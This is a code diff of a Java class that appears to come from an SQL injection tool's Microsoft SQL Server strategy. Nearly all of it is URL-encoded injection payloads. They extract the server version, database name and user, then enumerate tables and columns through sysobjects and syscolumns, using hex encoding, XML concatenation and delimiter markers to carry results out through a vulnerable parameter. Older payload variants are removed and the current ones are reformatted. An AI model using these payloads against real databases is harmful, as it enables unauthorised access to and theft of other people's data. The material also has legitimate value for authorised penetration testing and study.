@@ -17,12 +17,7 @@ public class MSSQLServerStrategy implements ISQLStrategy {
     @Override
     public String getSchemaInfos() {
         return
-//            "SELECT+" +
-//                "CAST(N''AS+XML).value('xs:hexBinary(sql:column(\"bin\"))','VARCHAR(MAX)')%2B'i'" +
-//            "FROM(" +
-//                "SELECT+CAST((cast(@@version%2B'{%}'%2BDB_NAME()%2B'{%}'%2Buser%2B'{%}'%2Buser_name()AS+VARCHAR(MAX)))AS+VARBINARY(MAX))AS+bin" +
-//            ")x";
-        "SELECT+@@version%2B'{%}'%2BDB_NAME()%2B'{%}'%2Buser%2B'{%}'%2Buser_name()%2B'%01%03%03%07'";
+            "SELECT+@@version%2B'{%}'%2BDB_NAME()%2B'{%}'%2Buser%2B'{%}'%2Buser_name()%2B'%01%03%03%07'";
     }
 
     @Override
@@ -53,53 +48,27 @@ public class MSSQLServerStrategy implements ISQLStrategy {
                         "where+1=1+{limit}+order+by+1+FOR+XML+PATH('')" +
                     ")" +
                 ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
-//        "SELECT+" +
-//        "replace(STUFF(" +
-//            "(" +
-//                "SELECT" +
-//                    "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
-//                "FROM+" +
-//                    "(select+name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+from+"+ database + "..sysobjects+WHERE+xtype='U')x+" +
-//                "WHERE+1=1+{limit}+FOR+XML+PATH('')" +
-//            ")" +
-//        ",1,1,'')%2B'i',',','gg')";
     }
 
     @Override
     public String getColumnList(Table table) {
         try {
             return
-//            "SELECT+" +
-//                "replace(STUFF(" +
-//                    "(" +
-//                        "SELECT" +
-//                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
-//                        "FROM+(select+c.name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+" +
-//                        "FROM+" +
-//                            table.getParent() + "..syscolumns+c," +
-//                            table.getParent() + "..sysobjects+t+" +
-//                        "WHERE+" +
-//                            "c.id=t.id+" +
-//                        "AND+t.name='" + table + "')x+" +
-//                            
-//                        "WHERE+1=1+{limit}+FOR+XML+PATH('')" +
-//                    ")" +
-//                ",1,1,'')%2B'i',',','gg')";
-            "SELECT+" +
-                "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
-                    "(" +
-                        "SELECT" +
-                            "+replace(sys.fn_varbintohexstr(CAST(','%2b'%04'%2BCAST(name+AS+VARCHAR(MAX))%2B'%050%04'AS+VARBINARY(MAX))),'0x','')" +
-                        "FROM+" +
-                            "(select+c.name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+FROM+" +
-                                table.getParent() + "..syscolumns+c," +
-                                table.getParent() + "..sysobjects+t+" +
-                            "WHERE+" +
-                                "c.id=t.id+" +
-                            "AND+t.name='" + URLEncoder.encode(table.toString(), "UTF-8") + "')x+" +
-                        "where+1=1+{limit}+order+by+1+FOR+XML+PATH('')" +
-                    ")" +
-                ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
+                "SELECT+" +
+                    "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
+                        "(" +
+                            "SELECT" +
+                                "+replace(sys.fn_varbintohexstr(CAST(','%2b'%04'%2BCAST(name+AS+VARCHAR(MAX))%2B'%050%04'AS+VARBINARY(MAX))),'0x','')" +
+                            "FROM+" +
+                                "(select+c.name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+FROM+" +
+                                    table.getParent() + "..syscolumns+c," +
+                                    table.getParent() + "..sysobjects+t+" +
+                                "WHERE+" +
+                                    "c.id=t.id+" +
+                                "AND+t.name='" + URLEncoder.encode(table.toString(), "UTF-8") + "')x+" +
+                            "where+1=1+{limit}+order+by+1+FOR+XML+PATH('')" +
+                        ")" +
+                    ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
         } catch (UnsupportedEncodingException e) {
             e.printStackTrace();
         }
@@ -343,4 +312,8 @@ public class MSSQLServerStrategy implements ISQLStrategy {
         return "and+rnum+BETWEEN+" + (limitSQLResult+1) + "+AND+65536";
     }
 
+    @Override
+    public String getDbLabel() {
+        return null;
+    }
 }
